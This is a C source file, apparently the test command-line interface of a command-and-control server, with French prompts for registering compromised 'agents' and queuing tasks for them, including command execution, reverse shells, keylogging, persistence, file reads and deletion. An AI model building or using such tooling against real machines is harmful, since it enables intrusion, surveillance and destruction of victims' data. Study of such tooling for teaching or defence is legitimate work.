#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cli.h"
#include "agent.h"
#include "task.h"

int check_agent_exists(const char *agent_uid) {
    struct Agent *agent = find_agent(agent_uid);
    if (agent == NULL) {
        printf("Erreur: L'agent avec l'UID %s n'existe pas.\n", agent_uid);
        return 0;
    }
    return 1;
}

void run_cli() {
    char command[20];
    char subcommand[20];
    char username[33];
    char hostname[65];
    char os[33];
    char agent_uid[38];
    char param1[256];
    char param2[256];
    char param3[256];
    int running = 1;

    printf("=== Serveur C2 - Interface de test ===\n");

    while (running) {
        printf("\nCommandes disponibles:\n");
        printf("1. add    - Ajouter un nouvel agent\n");
        printf("2. list   - Lister tous les agents & les taches\n");
        printf("3. task   - Gérer les tâches\n");
        printf("4. exit   - Quitter\n");
        printf("\nEntrez une commande: ");

        scanf("%19s", command);

        if (strcmp(command, "add") == 0 || strcmp(command, "1") == 0) {
            printf("Entrez le nom d'utilisateur: ");
            scanf("%32s", username);

            printf("Entrez le nom d'hôte: ");
            scanf("%64s", hostname);

            printf("Entrez le système d'exploitation: ");
            scanf("%32s", os);

            struct Agent* agent = add_agent(username, hostname, os);
            if (agent != NULL) {
                printf("Agent ajouté avec succès!\n");
                printf("UID: %s\n", agent->uid);
            } else {
                printf("Erreur lors de l'ajout de l'agent.\n");
            }
        }
        else if (strcmp(command, "list") == 0 || strcmp(command, "2") == 0) {
            printf("Que voulez-vous lister? (agents/tasks): ");
            scanf("%19s", subcommand);

            if (strcmp(subcommand, "agents") == 0) {
                list_agents();
            } else if (strcmp(subcommand, "tasks") == 0) {
                list_tasks();
            } else {
                printf("Option non reconnue. Utilisez 'agents' ou 'tasks'.\n");
            }
        }
        else if (strcmp(command, "task") == 0 || strcmp(command, "3") == 0) {
            printf("Sous-commande (sleep/execve/locate/revshell/keylog/persist/cat/mv/rm/ps/netstat): ");
            scanf("%19s", subcommand);

            if (strcmp(subcommand, "sleep") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Temps de sommeil (secondes): ");
                scanf("%255s", param1);
                printf("Jitter (optionnel, appuyez sur Entrée pour ignorer): ");

                getchar();

                if (fgets(param2, sizeof(param2), stdin) != NULL) {
                    size_t len = strlen(param2);
                    if (len > 0 && param2[len-1] == '\n') {
                        param2[len-1] = '\0';
                    }
                }

                char action[512];
                if (strlen(param2) > 0) {
                    snprintf(action, sizeof(action), "sleep %s %s", param1, param2);
                } else {
                    snprintf(action, sizeof(action), "sleep %s", param1);
                }

                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche sleep envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "execve") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Chemin de la commande: ");
                scanf("%255s", param1);
                printf("Arguments (optionnel, appuyez sur Entrée pour ignorer): ");

                getchar();

                if (fgets(param2, sizeof(param2), stdin) != NULL) {
                    size_t len = strlen(param2);
                    if (len > 0 && param2[len-1] == '\n') {
                        param2[len-1] = '\0';
                    }
                }

                char action[512];
                if (strlen(param2) > 0) {
                    snprintf(action, sizeof(action), "execve %s %s", param1, param2);
                } else {
                    snprintf(action, sizeof(action), "execve %s", param1);
                }

                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche execve envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "locate") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                struct Task* task = add_task(agent_uid, "locate");
                if (task != NULL) {
                    printf("Tâche locate envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "revshell") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Port local: ");
                scanf("%255s", param1);
                printf("Hôte local (optionnel, appuyez sur Entrée pour ignorer): ");

                getchar();

                if (fgets(param2, sizeof(param2), stdin) != NULL) {
                    size_t len = strlen(param2);
                    if (len > 0 && param2[len-1] == '\n') {
                        param2[len-1] = '\0';
                    }
                }

                char action[512];
                if (strlen(param2) > 0) {
                    snprintf(action, sizeof(action), "revshell %s %s", param1, param2);
                } else {
                    snprintf(action, sizeof(action), "revshell %s", param1);
                }

                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche revshell envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "keylog") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("État (on/off): ");
                scanf("%255s", param1);
                printf("Chemin du fichier (optionnel, appuyez sur Entrée pour ignorer): ");

                getchar();

                if (fgets(param2, sizeof(param2), stdin) != NULL) {
                    size_t len = strlen(param2);
                    if (len > 0 && param2[len-1] == '\n') {
                        param2[len-1] = '\0';
                    }
                }

                char action[512];
                if (strlen(param2) > 0) {
                    snprintf(action, sizeof(action), "keylog %s %s", param1, param2);
                } else {
                    snprintf(action, sizeof(action), "keylog %s", param1);
                }

                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche keylog envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "persist") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("État (on/off): ");
                scanf("%255s", param1);

                char action[512];
                snprintf(action, sizeof(action), "persist %s", param1);
                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche persist envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "cat") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Chemin du fichier: ");
                scanf("%255s", param1);

                char action[512];
                snprintf(action, sizeof(action), "cat %s", param1);
                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche cat envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "mv") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Source: ");
                scanf("%255s", param1);
                printf("Destination: ");
                scanf("%255s", param2);

                char action[512];
                snprintf(action, sizeof(action), "mv %s %s", param1, param2);
                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche mv envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "rm") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                printf("Chemin du fichier/dossier: ");
                scanf("%255s", param1);

                char action[512];
                snprintf(action, sizeof(action), "rm %s", param1);
                struct Task* task = add_task(agent_uid, action);
                if (task != NULL) {
                    printf("Tâche rm envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "ps") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }

                struct Task* task = add_task(agent_uid, "ps");
                if (task != NULL) {
                    printf("Tâche ps envoyée à l'agent %s\n", agent_uid);
                }
            }
            else if (strcmp(subcommand, "netstat") == 0) {
                printf("UID de l'agent: ");
                scanf("%37s", agent_uid);

                if (!check_agent_exists(agent_uid)) {
                    continue;
                }
                
                struct Task* task = add_task(agent_uid, "netstat");
                if (task != NULL) {
                    printf("Tâche netstat envoyée à l'agent %s\n", agent_uid);
                }
            }
            else {
                printf("Sous-commande non reconnue.\n");
            }
        }
        else if (strcmp(command, "exit") == 0 || strcmp(command, "4") == 0) {
            printf("Au revoir!\n");
            running = 0;
        }
        else {
            printf("Commande non reconnue.\n");
        }
    }
}